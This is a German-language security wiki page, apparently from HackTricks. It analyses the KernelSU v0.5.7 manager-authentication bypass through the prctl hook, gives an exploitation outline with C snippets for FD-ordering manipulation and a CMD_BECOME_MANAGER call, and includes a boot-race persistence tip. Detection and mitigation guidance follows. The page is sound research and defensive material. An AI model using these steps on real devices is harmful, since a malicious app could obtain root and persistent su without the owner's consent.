# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks wie KernelSU, APatch und SKRoot patchen oder hooken den Android/Linux-Kernel und stellen einer unprivilegierten Userspace-Manager-App privilegierte Funktionen bereit. Magisk wird weiter unten separat behandelt, da CVE-2024-48336 das Laden von Code auf der Manager-Seite und nicht diesen KernelSU-syscall-Pfad betraf.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Diese Seite abstrahiert die in der öffentlichen Forschung aufgedeckten Techniken und Fallstricke, insbesondere Zimperiums Analyse von KernelSU v0.5.7, um sowohl Red- als auch Blue-Teams beim Verständnis von Angriffsflächen, Exploitation-Primitives und robusten Mitigations zu unterstützen.<sup>[[1]](#references)</sup>

---
## Architektur-Muster: syscall-hooked manager channel

- In KernelSU v0.5.7 empfängt ein Kernel-Hook auf `prctl` einen Magic Value, eine Command-ID und command-spezifische Argumente aus dem Userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Der Aufrufer fordert zunächst den Manager-Status mit `CMD_BECOME_MANAGER` an. Die Autorisierung ist command-spezifisch: `CMD_GRANT_ROOT` prüft den Manager-/Allowlist-Status, `CMD_ALLOW_SU` ist nur für den Manager zulässig, und `CMD_SET_SEPOLICY` ist in dieser Version nur für root zulässig.<sup>[[2]](#references)[[11]](#references)</sup>
- Andere Commands fragen die Version/Konfiguration ab oder melden Framework-Ereignisse.<sup>[[2]](#references)</sup>
- Da jede App dieses syscall interface aufrufen kann, ist die Korrektheit der Manager-Authentifizierung entscheidend.<sup>[[1]](#references)[[2]](#references)</sup>

Beispiel (KernelSU-Design):
- Hooked syscall: prctl
- Magic Value zur Umleitung an den KernelSU-Handler: 0xDEADBEEF
- Commands umfassen: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT usw.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## KernelSU v0.5.7 authentication flow (wie implementiert)

Wenn der Userspace `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...)` aufruft, prüft KernelSU Folgendes:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Path prefix check
- Der angegebene Pfad muss mit einem erwarteten Prefix für die aufrufende UID beginnen, z. B. /data/data/<pkg> oder /data/user/<id>/<pkg>.
- Referenz: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Der Pfad muss der aufrufenden UID gehören.
- Referenz: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- Die geöffneten File Descriptors des aufrufenden Prozesses werden in aufsteigender Descriptor-Reihenfolge durchlaufen.
- Für jede reguläre Datei, deren Pfad mit `/data/app/` beginnt und mit `/base.apk` endet, muss der Pfad den aus dem angegebenen Data-Directory-Pfad abgeleiteten Package-Substring enthalten.
- Die Signatur des ersten Kandidaten, der diese Path Checks erfüllt, wird verifiziert.
- Die APK-v2-Signatur wird geparst und gegen das offizielle Manager-Zertifikat verifiziert.
- Referenzen: manager.c (Iterieren über FDs), apk_sign.c (APK-v2-Verifizierung).<sup>[[3]](#references)[[4]](#references)</sup>

Wenn alle Checks erfolgreich sind, cached der Kernel die UID des Managers vorübergehend; Manager-only Commands akzeptieren anschließend diese UID, während andere Commands weiterhin ihre eigene UID oder Allowlist-Checks verwenden.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Vulnerability class: trusting path-derived APK selection

KernelSU v0.5.7 bindet das Signaturergebnis nicht an die installierte Package-Identität des PackageManagers. In `manager.c` ist der Package-Test lediglich ein Path-Substring-Check (`strstr(cwd, pkg)`); anschließend wird der erste Kandidat, der diesen Path Check erfüllt, einer Signaturprüfung unterzogen. Ein Angreifer kann daher eine echte Manager-APK unter einem `/data/app/`-Pfad ablegen, der ebenfalls den Package-Namen des Angreifers enthält, und dafür sorgen, dass sie zuerst ausgewählt wird.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Dieses Trust-by-Indirection ermöglicht es einer unprivilegierten App, den Manager zu impersonaten, ohne den Signing Key des Managers zu besitzen.<sup>[[1]](#references)</sup>

Ausgenutzte Schlüsseleigenschaften:<sup>[[1]](#references)[[3]](#references)</sup>
- Der FD-Scan ist nach Descriptor-Index geordnet, und der Package-Check ist ein Path-Substring-Test und keine verifizierte Package-to-APK-Identity-Bindung.
- `open()` gibt den niedrigsten verfügbaren FD zurück. Durch vorheriges Schließen von FDs mit niedrigeren Nummern kann ein Angreifer die Reihenfolge kontrollieren.
- Eine mitgelieferte Manager-APK kann unter `/data/app/` in einem Pfad abgelegt werden, der den Package-String des Angreifers enthält, während sie die offizielle Manager-Signatur beibehält.

---
## Attack preconditions

Der konkrete Fall für KernelSU v0.5.7 erfordert:<sup>[[1]](#references)[[3]](#references)</sup>

- Das Gerät ist bereits mit einem verwundbaren Rooting Framework gerootet, z. B. KernelSU v0.5.7.
- Der Angreifer kann lokal beliebigen unprivilegierten Code ausführen, etwa in einem Android-App-Prozess.
- Bei der v0.5.7-Implementierung muss `current->real_parent` die UID 0 besitzen (der Source-Kommentar beschreibt dies als zygote direct-child requirement); `manager.c` weist andere Parent-Prozesse zurück.<sup>[[3]](#references)</sup>
- Der echte Manager wurde noch nicht authentifiziert, etwa direkt nach einem Reboot. Einige Frameworks cachen die Manager-UID nach erfolgreicher Authentifizierung; der Angreifer muss den Race gewinnen.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level-Schritte (das zitierte Demo-Video zeigt den öffentlichen Proof of Concept in Aktion):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Einen gültigen Pfad zum eigenen App-Data-Directory erstellen, um die Prefix- und Ownership-Checks zu erfüllen.
2) Eine echte KernelSU-Manager-base.apk unter `/data/app/` in einem Pfad ablegen, der den eigenen Package-String enthält, und sie auf einem FD mit niedrigerer Nummer als der eigenen base.apk öffnen.
3) `prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...)` aufrufen, um die Checks zu bestehen.
4) `CMD_GRANT_ROOT` und anschließend `CMD_ALLOW_SU` für persistentes su verwenden; den root-only Command `CMD_SET_SEPOLICY` erst nach Erlangung von root und nur dort aufrufen, wo er unterstützt wird.

Praktische Hinweise zu Schritt 2 (FD ordering):<sup>[[1]](#references)</sup>
- Den FD des eigenen `/data/app/*/base.apk` im Prozess ermitteln, indem die Symlinks unter `/proc/self/fd` durchlaufen werden.
- Einen niedrigen FD schließen, z. B. stdin, fd 0, und die legitime Manager-APK zuerst öffnen, sodass sie fd 0 belegt oder einen anderen Index erhält, der niedriger als der FD der eigenen base.apk ist.
- Die legitime Manager-APK mit der eigenen App bundlen, sodass ihr Pfad mit `/data/app/` beginnt, mit `/base.apk` endet und den eigenen Package-String enthält. Beispielsweise kann ein Pfad unter dem `lib`-Verzeichnis der eigenen App diese Checks erfüllen.<sup>[[1]](#references)[[3]](#references)</sup>

Example code snippets (Android/Linux, nur zur Veranschaulichung):

Offene FDs aufzählen, um base.apk-Einträge zu finden:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Erzwinge, dass ein FD mit niedrigerer Nummer auf die legitime Manager-APK zeigt:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Manager-Authentifizierung über den `prctl`-Hook von KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
uint32_t reply = 0;
// arg3: data path; arg4: unused; arg5: userspace result pointer
(void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
(unsigned long)my_data_dir, 0UL,
(unsigned long)&reply);
return reply == KSU_MAGIC ? 0 : -1;
}
```
Nach erfolgreichem Abschluss, privilegierte Befehle (Beispiele):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: aktuellen Prozess zu root hochstufen
- CMD_ALLOW_SU: dein Package/deine UID zur allowlist für persistentes su hinzufügen
- CMD_SET_SEPOLICY: SELinux policy nach dem Erlangen von root anpassen; KernelSU v0.5.7 prüft für diesen Befehl auf UID 0.<sup>[[2]](#references)</sup>

Race/Persistence-Hinweis:
- Einen BOOT_COMPLETED receiver im AndroidManifest (`RECEIVE_BOOT_COMPLETED`) registrieren, um nach einem Reboot zu starten und die Authentifizierung vor dem echten manager zu versuchen; die Permission autorisiert den Empfang von `ACTION_BOOT_COMPLETED`, garantiert jedoch selbst keine Scheduling-Priorität.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Erkennungs- und Mitigationshinweise

Für framework developers:
- Die Authentifizierung an das Package/die UID des Aufrufers binden, nicht an beliebige FDs:
- Das Package des Aufrufers anhand seiner UID auflösen und es gegen die Signatur des installierten Packages verifizieren (über PackageManager), statt FDs zu durchsuchen.
- Wenn dies ausschließlich im Kernel erfolgt, eine stabile Identität des Aufrufers (task creds) verwenden und gegen eine stabile, von init/einem userspace helper verwaltete Quelle der Wahrheit validieren, nicht gegen Prozess-FDs.
- Keine Path-Prefix-Prüfungen als Identität verwenden; sie können vom Aufrufer trivial erfüllt werden.
- Eine auf Nonces basierende Challenge–Response über den Channel verwenden und jede gecachte manager identity beim Boot oder bei wichtigen Events löschen.
- Soweit möglich authentifizierte Binder-basierte IPC in Betracht ziehen, statt generische Syscalls zweckzuentfremden.

Für defenders/blue team:
- Das Vorhandensein von rooting frameworks und manager processes erkennen; auf prctl-Aufrufe mit verdächtigen magic constants (z. B. 0xDEADBEEF) überwachen, wenn Kernel-Telemetrie verfügbar ist.<sup>[[1]](#references)[[11]](#references)</sup>
- In verwalteten Flotten Boot receivers aus nicht vertrauenswürdigen Packages blockieren oder melden, die nach dem Boot rasch privilegierte manager-Befehle versuchen.
- Sicherstellen, dass Geräte auf aktualisierten, gepatchten framework-Versionen laufen; gecachte manager IDs nach einem Update ungültig machen.

Einschränkungen des Angriffs:<sup>[[1]](#references)[[2]](#references)</sup>
- Betrifft nur Geräte, die bereits mit einem verwundbaren framework gerootet wurden.
- Erfordert typischerweise einen Reboot/ein Race-Fenster, bevor der legitime manager sich authentifiziert (manche frameworks cachen die manager-UID bis zum Reset).

---
## Verwandte Hinweise zu verschiedenen frameworks

- Password-basierte Authentifizierung (z. B. historische APatch-/SKRoot-Builds) kann schwach sein, wenn Passwörter erratbar/bruteforcebar sind oder die Validierungen fehlerhaft sind.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package-/signaturbasierte Authentifizierung (z. B. KernelSU) ist prinzipiell stärker, muss jedoch an den tatsächlichen Aufrufer gebunden werden, nicht an aus Pfaden abgeleitete Artefakte, die durch FD-Scans ausgewählt werden.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 betraf Pre-Canary-27007-Builds, die Code aus einem nicht verifizierten GMS-Package luden. Dadurch konnte eine lokale App Code in der Magisk-App ausführen und ohne Benutzerinteraktion zu root eskalieren.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Das Rooting des Bösen: Sicherheitslücken, die dein Mobilgerät gefährden könnten](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – Authentifizierungsprüfungen in core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – FD-Iteration, Package-Prüfung und Signaturaufruf in manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – APK-v2-Verifizierung in apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [KernelSU-Projekt](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Magisk-Issue #8279 – Überprüfen, ob GMS eine System-App ist](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [KSU-PoC-Demovideo (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – Befehlsbezeichner in ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
